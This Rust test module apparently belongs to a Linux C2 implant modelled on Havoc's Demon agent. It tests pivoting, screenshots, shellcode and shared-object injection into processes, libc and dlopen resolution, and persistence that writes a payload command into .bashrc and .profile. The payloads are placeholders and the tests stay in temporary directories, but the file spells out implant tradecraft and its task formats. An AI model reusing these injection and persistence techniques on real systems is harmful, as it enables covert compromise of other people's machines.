        std::thread::sleep(Duration::from_millis(10));

        state.poll_pivots();

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback from poll");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::SmbCommand));

        // The frame data follows as length-prefixed bytes (the full envelope).
        let frame_len = read_u32(payload, &mut offset) as usize;
        assert_eq!(frame_len, envelope.len());
    }

    #[tokio::test]
    async fn poll_pivots_detects_broken_connection() {
        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
        left.set_nonblocking(true).expect("nonblocking");

        let child_id: u32 = 0xDEAD_0001;
        let mut state = PhantomState::default();
        state.smb_pivots.insert(
            child_id,
            super::PivotConnection { pipe_name: "/tmp/broken".to_owned(), stream: left },
        );

        // Close the child side to simulate a broken pipe.
        drop(right);

        // Give the OS a moment.
        std::thread::sleep(Duration::from_millis(10));

        state.poll_pivots();

        // Should have removed the pivot and sent a disconnect callback.
        assert!(!state.smb_pivots.contains_key(&child_id));
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
    }

    // --- CommandScreenshot tests ---

    /// Sending a `CommandScreenshot` package through the dispatcher must produce
    /// a `Structured` callback with `command_id == CommandScreenshot`.  The payload
    /// starts with a success flag (u32).  In CI/test environments without a display
    /// the flag will be 0 (failure) — that is fine; the important thing is that the
    /// dispatcher routes the command and produces a well-formed response.
    #[tokio::test]
    async fn screenshot_dispatcher_routes_command_and_queues_callback() {
        let mut state = PhantomState::default();
        let package = DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
        assert!(result.is_ok(), "execute must not return an error");
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1, "exactly one callback expected");
        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
            panic!("expected Structured callback, got {:?}", callbacks[0]);
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandScreenshot));
        assert_eq!(*request_id, 0x42);
        // The first 4 bytes must be the success flag (0 or 1).
        assert!(payload.len() >= 4, "payload must contain at least the success flag");
        let mut offset = 0;
        let success = read_u32(payload, &mut offset);
        assert!(success <= 1, "success flag must be 0 or 1, got {success}");
    }

    /// When the screenshot succeeds (tested by mocking via a helper), the response
    /// payload must be `[1:u32][len:u32][image_bytes]`.
    #[tokio::test]
    async fn screenshot_success_payload_format() {
        let mut state = PhantomState::default();
        // Construct a known-good structured callback as execute_screenshot would.
        let fake_image = b"PNG_TEST_DATA";
        let mut expected_payload = super::encode_u32(1);
        expected_payload.extend_from_slice(&super::encode_bytes(fake_image).expect("encode_bytes"));
        state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandScreenshot),
            request_id: 0xAA,
            payload: expected_payload.clone(),
        });
        let callbacks = state.drain_callbacks();
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured");
        };
        let mut offset = 0;
        let success = read_u32(payload, &mut offset);
        assert_eq!(success, 1);
        let image = read_bytes(payload, &mut offset);
        assert_eq!(image, fake_image);
    }

    /// When screenshot capture fails, the response payload must be just `[0:u32]`.
    #[tokio::test]
    async fn screenshot_failure_payload_format() {
        let mut state = PhantomState::default();
        // Simulate failure: encode success=0 (same as execute_screenshot does).
        let expected_payload = super::encode_u32(0);
        state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandScreenshot),
            request_id: 0xBB,
            payload: expected_payload,
        });
        let callbacks = state.drain_callbacks();
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured");
        };
        assert_eq!(payload.len(), 4, "failure payload must be exactly 4 bytes");
        let mut offset = 0;
        let success = read_u32(payload, &mut offset);
        assert_eq!(success, 0);
    }

    // -----------------------------------------------------------------------
    // Process injection tests
    // -----------------------------------------------------------------------

    /// Helper to build a `CommandInjectShellcode` task payload.
    fn build_inject_shellcode_payload(
        way: i32,
        technique: i32,
        x64: i32,
        shellcode: &[u8],
        argument: &[u8],
        pid: i32,
    ) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&way.to_le_bytes());
        payload.extend_from_slice(&technique.to_le_bytes());
        payload.extend_from_slice(&x64.to_le_bytes());
        // shellcode as length-prefixed bytes
        payload.extend_from_slice(&(shellcode.len() as i32).to_le_bytes());
        payload.extend_from_slice(shellcode);
        // argument as length-prefixed bytes
        payload.extend_from_slice(&(argument.len() as i32).to_le_bytes());
        payload.extend_from_slice(argument);
        // pid
        payload.extend_from_slice(&pid.to_le_bytes());
        payload
    }

    /// Helper to build a `CommandInjectDll` task payload.
    fn build_inject_dll_payload(
        technique: i32,
        pid: i32,
        dll_ldr: &[u8],
        dll_bytes: &[u8],
        parameter: &[u8],
    ) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&technique.to_le_bytes());
        payload.extend_from_slice(&pid.to_le_bytes());
        // dll_ldr as length-prefixed bytes
        payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
        payload.extend_from_slice(dll_ldr);
        // dll_bytes as length-prefixed bytes
        payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
        payload.extend_from_slice(dll_bytes);
        // parameter as length-prefixed bytes
        payload.extend_from_slice(&(parameter.len() as i32).to_le_bytes());
        payload.extend_from_slice(parameter);
        payload
    }

    /// Helper to build a `CommandSpawnDll` task payload.
    fn build_spawn_dll_payload(dll_ldr: &[u8], dll_bytes: &[u8], arguments: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        // dll_ldr as length-prefixed bytes
        payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
        payload.extend_from_slice(dll_ldr);
        // dll_bytes as length-prefixed bytes
        payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
        payload.extend_from_slice(dll_bytes);
        // arguments as length-prefixed bytes
        payload.extend_from_slice(&(arguments.len() as i32).to_le_bytes());
        payload.extend_from_slice(arguments);
        payload
    }

    /// `CommandInjectShellcode` with an invalid PID produces a failure
    /// response with status != 0 and the correct command ID.
    #[tokio::test]
    async fn inject_shellcode_invalid_pid_returns_failure() {
        let shellcode = b"\xcc"; // int3
        let payload = build_inject_shellcode_payload(
            super::INJECT_WAY_INJECT,
            0, // technique
            1, // x64
            shellcode,
            &[],
            999_999_999, // non-existent PID
        );
        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
            panic!("expected Structured callback, got: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectShellcode));
        assert_eq!(*request_id, 0x10);
        // Status should be non-zero (failure).
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_ne!(status, 0, "injection into non-existent PID must fail");
    }

    /// `CommandInjectShellcode` with empty shellcode produces a failure response.
    #[tokio::test]
    async fn inject_shellcode_empty_payload_returns_failure() {
        let payload = build_inject_shellcode_payload(
            super::INJECT_WAY_EXECUTE,
            0,
            1,
            &[], // empty shellcode
            &[],
            0,
        );
        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x20, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_eq!(status, super::INJECT_ERROR_FAILED);
    }

    /// `CommandInjectShellcode` with unknown injection way returns failure.
    #[tokio::test]
    async fn inject_shellcode_unknown_way_returns_failure() {
        let payload = build_inject_shellcode_payload(
            99, // unknown way
            0,
            1,
            b"\x90", // NOP
            &[],
            0,
        );
        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x30, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_eq!(status, super::INJECT_ERROR_FAILED);
    }

    /// `CommandInjectDll` with a non-existent PID produces a failure response.
    #[tokio::test]
    async fn inject_dll_invalid_pid_returns_failure() {
        let dll_bytes = b"\x7fELF_fake_so"; // not a real .so but exercises the path
        let payload = build_inject_dll_payload(
            0,           // technique
            999_999_999, // non-existent PID
            &[],         // dll_ldr (ignored on Linux)
            dll_bytes,
            &[], // parameter
        );
        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x40, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectDll));
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_ne!(status, 0, "injection into non-existent PID must fail");
    }

    /// `CommandInjectDll` with empty .so bytes produces a failure response.
    #[tokio::test]
    async fn inject_dll_empty_payload_returns_failure() {
        let payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x50, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_eq!(status, super::INJECT_ERROR_FAILED);
    }

    /// `CommandSpawnDll` with empty .so bytes produces a failure response.
    #[tokio::test]
    async fn spawn_dll_empty_payload_returns_failure() {
        let payload = build_spawn_dll_payload(&[], &[], &[]);
        let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 0x60, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
            panic!("expected Structured callback");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandSpawnDll));
        let mut offset = 0;
        let status = read_u32(payload, &mut offset);
        assert_eq!(status, super::INJECT_ERROR_FAILED);
    }

    /// Verify that all three injection response payloads are exactly 4 bytes
    /// (a single u32 status), matching the Demon protocol.
    #[tokio::test]
    async fn injection_response_payload_is_4_bytes() {
        let mut state = PhantomState::default();

        // Inject shellcode with empty payload (will fail, but response format is what matters).
        let sc_payload =
            build_inject_shellcode_payload(super::INJECT_WAY_EXECUTE, 0, 1, &[], &[], 0);
        execute(
            &DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, sc_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("execute shellcode");

        // Inject DLL with empty payload.
        let dll_payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
        execute(
            &DemonPackage::new(DemonCommand::CommandInjectDll, 2, dll_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("execute dll");

        // Spawn DLL with empty payload.
        let spawn_payload = build_spawn_dll_payload(&[], &[], &[]);
        execute(
            &DemonPackage::new(DemonCommand::CommandSpawnDll, 3, spawn_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("execute spawn dll");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 3);
        for cb in &callbacks {
            let PendingCallback::Structured { payload, .. } = cb else {
                panic!("expected Structured callback");
            };
            assert_eq!(payload.len(), 4, "injection response must be exactly 4 bytes (u32 status)");
        }
    }

    /// Verify that `find_libc_base` returns a valid address for our own process.
    #[test]
    fn find_libc_base_returns_valid_address() {
        let pid = std::process::id();
        let base = super::find_libc_base(pid);
        assert!(base.is_some(), "should find libc in own process");
        assert!(base.expect("checked") > 0);
    }

    /// Verify that `resolve_dlopen_in_target` returns an address for our own libc.
    #[test]
    fn resolve_dlopen_returns_valid_address() {
        let pid = std::process::id();
        let libc_base = super::find_libc_base(pid).expect("find libc base");
        let addr = super::resolve_dlopen_in_target(libc_base);
        assert!(addr.is_some(), "should resolve dlopen in own process");
        assert!(addr.expect("checked") > libc_base, "dlopen should be past libc base");
    }

    // ---- Windows-only command rejection tests ----

    /// Helper: verify a Windows-only command returns a not-supported error.
    async fn assert_windows_only_rejected(command: DemonCommand) {
        let package = DemonPackage::new(command, 77, Vec::new());
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
            panic!("expected single Error callback for {command:?}, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 77);
        assert!(
            text.contains("not supported on Linux"),
            "expected 'not supported on Linux' in error for {command:?}, got: {text}",
        );
    }

    #[tokio::test]
    async fn windows_only_command_token_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandToken).await;
    }

    #[tokio::test]
    async fn windows_only_command_inline_execute_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandInlineExecute).await;
    }

    #[tokio::test]
    async fn windows_only_command_job_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandJob).await;
    }

    #[tokio::test]
    async fn windows_only_command_ps_import_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandPsImport).await;
    }

    #[tokio::test]
    async fn windows_only_command_assembly_inline_execute_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandAssemblyInlineExecute).await;
    }

    #[tokio::test]
    async fn windows_only_command_assembly_list_versions_rejected() {
        assert_windows_only_rejected(DemonCommand::CommandAssemblyListVersions).await;
    }

    // ------------------------------------------------------------------
    // CommandPackageDropped
    // ------------------------------------------------------------------

    #[tokio::test]
    async fn package_dropped_queues_error_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(128_000_i32).to_le_bytes()); // dropped length
        payload.extend_from_slice(&(65_536_i32).to_le_bytes()); // max length
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state)
            .await
            .expect("execute package dropped");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Error { request_id, text } = &callbacks[0] else {
            panic!("expected Error callback, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 42);
        assert!(text.contains("128000"), "should mention dropped length");
        assert!(text.contains("65536"), "should mention max length");
    }

    #[tokio::test]
    async fn package_dropped_marks_matching_download_for_removal() {
        let mut state = PhantomState::default();

        // Manually insert an active download with request_id 99.
        let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped");
        std::fs::write(&tmp, b"test data").expect("write temp file");
        let file = std::fs::File::open(&tmp).expect("open temp file");
        state.downloads.push(super::ActiveDownload {
            file_id: 1,
            request_id: 99,
            file,
            total_size: 9,
            read_size: 0,
            state: DownloadTransferState::Running,
        });

        let mut payload = Vec::new();
        payload.extend_from_slice(&(200_000_i32).to_le_bytes());
        payload.extend_from_slice(&(65_536_i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Remove);

        let _ = std::fs::remove_file(&tmp);
    }

    #[tokio::test]
    async fn package_dropped_leaves_unrelated_downloads_intact() {
        let mut state = PhantomState::default();

        let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped_other");
        std::fs::write(&tmp, b"other data").expect("write temp file");
        let file = std::fs::File::open(&tmp).expect("open temp file");
        state.downloads.push(super::ActiveDownload {
            file_id: 2,
            request_id: 50,
            file,
            total_size: 10,
            read_size: 0,
            state: DownloadTransferState::Running,
        });

        let mut payload = Vec::new();
        payload.extend_from_slice(&(200_000_i32).to_le_bytes());
        payload.extend_from_slice(&(65_536_i32).to_le_bytes());
        // Different request_id — should not touch the download.
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);

        let _ = std::fs::remove_file(&tmp);
    }

    #[tokio::test]
    async fn package_dropped_with_short_payload_returns_parse_error() {
        // Only one u32 instead of two.
        let payload = (128_000_i32).to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
        let mut state = PhantomState::default();

        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
        assert!(result.is_err());
    }

    // ── Persistence tests ──────────────────────────────────────────────────

    fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
        let mut p = Vec::new();
        p.extend_from_slice(&(method as i32).to_le_bytes());
        p.extend_from_slice(&(op as i32).to_le_bytes());
        if op == 0 {
            // Install: include length-prefixed command string
            let cmd_bytes = command.as_bytes();
            p.extend_from_slice(&(cmd_bytes.len() as i32).to_le_bytes());
            p.extend_from_slice(cmd_bytes);
        }
        p
    }

    #[tokio::test]
    async fn persist_unknown_method_returns_parse_error() {
        let payload = persist_payload(99, 0, "/bin/true");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
        let mut state = PhantomState::default();
        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
        assert!(result.is_err(), "unknown method must return a parse error");
    }

    #[tokio::test]
    async fn persist_unknown_op_returns_parse_error() {
        let payload = persist_payload(1, 99, "/bin/true");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
        let mut state = PhantomState::default();
        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
        assert!(result.is_err(), "unknown op must return a parse error");
    }

    #[test]
    fn remove_shell_rc_block_strips_delimited_section() {
        let text =
            "line1\nline2\n# BEGIN # red-cell-c2\n/bin/payload\n# END # red-cell-c2\nline3\n";
        let result =
            super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
        assert!(result.contains("line1"), "line before block must remain");
        assert!(result.contains("line3"), "line after block must remain");
        assert!(!result.contains("/bin/payload"), "command inside block must be removed");
        assert!(!result.contains("BEGIN"), "begin marker must be removed");
        assert!(!result.contains("END"), "end marker must be removed");
    }

    #[test]
    fn remove_shell_rc_block_no_block_returns_unchanged() {
        let text = "line1\nline2\n";
        let result =
            super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
        assert_eq!(result, "line1\nline2\n");
    }

    #[tokio::test]
    async fn persist_shell_rc_install_writes_block_to_tempfiles() {
        use std::fs;
        use tempfile::TempDir;

        let tmp = TempDir::new().expect("tempdir");
        let home = tmp.path().to_str().expect("valid path").to_owned();
        // SAFETY: single-threaded test environment

        unsafe {
            std::env::set_var("HOME", &home);
        }

        // Create stub rc files
        let bashrc = tmp.path().join(".bashrc");
        let profile = tmp.path().join(".profile");
        fs::write(&bashrc, "# existing\n").expect("write bashrc");
        fs::write(&profile, "# existing\n").expect("write profile");

        let payload = persist_payload(3, 0, "/bin/payload"); // ShellRc=3, Install=0
        let package = DemonPackage::new(DemonCommand::CommandPersist, 42, payload);
        let mut state = PhantomState::default();
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
            panic!("expected one Output callback, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 42);
        assert!(text.contains("installed"), "callback must confirm install: {text}");

        let bashrc_content = fs::read_to_string(&bashrc).expect("read bashrc");
        assert!(bashrc_content.contains("/bin/payload"), ".bashrc must contain payload cmd");
        assert!(bashrc_content.contains("red-cell-c2"), ".bashrc must contain marker");

        let profile_content = fs::read_to_string(&profile).expect("read profile");
        assert!(profile_content.contains("/bin/payload"), ".profile must contain payload cmd");
    }

    #[tokio::test]
    async fn persist_shell_rc_install_idempotent() {
        use std::fs;
        use tempfile::TempDir;

        let tmp = TempDir::new().expect("tempdir");
        let home = tmp.path().to_str().expect("valid path").to_owned();
        // SAFETY: single-threaded test environment

        unsafe {
            std::env::set_var("HOME", &home);
        }

        let bashrc = tmp.path().join(".bashrc");
        let profile = tmp.path().join(".profile");
        fs::write(&bashrc, "").expect("write bashrc");
        fs::write(&profile, "").expect("write profile");

        // Install once
        let payload = persist_payload(3, 0, "/bin/payload");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
        let mut state = PhantomState::default();
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
        let _ = state.drain_callbacks();

        // Install again — should report already present
        let payload2 = persist_payload(3, 0, "/bin/payload");
        let package2 = DemonPackage::new(DemonCommand::CommandPersist, 2, payload2);
        execute(&package2, &mut PhantomConfig::default(), &mut state).await.expect("execute");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
            panic!("expected one Output callback, got: {callbacks:?}");
        };
        assert!(
            text.contains("already present"),
            "second install must report already-present: {text}"
        );

        // Verify .bashrc has exactly one block
        let content = fs::read_to_string(&bashrc).expect("read bashrc");
        assert_eq!(content.matches("red-cell-c2").count(), 2, "one BEGIN + one END marker");
    }

    #[tokio::test]
    async fn persist_shell_rc_remove_strips_block() {
        use std::fs;
        use tempfile::TempDir;

        let tmp = TempDir::new().expect("tempdir");
        let home = tmp.path().to_str().expect("valid path").to_owned();
        // SAFETY: single-threaded test environment

        unsafe {
            std::env::set_var("HOME", &home);
        }

        let bashrc = tmp.path().join(".bashrc");
        let profile = tmp.path().join(".profile");
        fs::write(&bashrc, "").expect("write bashrc");
        fs::write(&profile, "").expect("write profile");

        // Install
        let payload = persist_payload(3, 0, "/bin/payload");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
        let mut state = PhantomState::default();
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("install");
        let _ = state.drain_callbacks();

        // Remove
        let payload_rm = persist_payload(3, 1, ""); // ShellRc=3, Remove=1
        let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 2, payload_rm);
        execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("remove");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
            panic!("expected one Output callback, got: {callbacks:?}");
        };
        assert!(text.contains("removed"), "callback must confirm removal: {text}");

        let content = fs::read_to_string(&bashrc).expect("read bashrc");
        assert!(!content.contains("/bin/payload"), ".bashrc must not contain payload after remove");
        assert!(!content.contains("red-cell-c2"), ".bashrc must not contain marker after remove");
    }

    #[tokio::test]
    async fn persist_shell_rc_remove_when_not_present() {
        use std::fs;
        use tempfile::TempDir;

        let tmp = TempDir::new().expect("tempdir");
        // SAFETY: single-threaded test environment

        unsafe {
            std::env::set_var("HOME", tmp.path().to_str().expect("valid path"));
        }
        fs::write(tmp.path().join(".bashrc"), "").expect("write bashrc");
        fs::write(tmp.path().join(".profile"), "").expect("write profile");

        let payload_rm = persist_payload(3, 1, "");
        let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 5, payload_rm);
        let mut state = PhantomState::default();
        execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("execute");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
            panic!("expected one Output callback, got: {callbacks:?}");
        };
        assert!(text.contains("not found"), "must report not-found: {text}");
    }
}
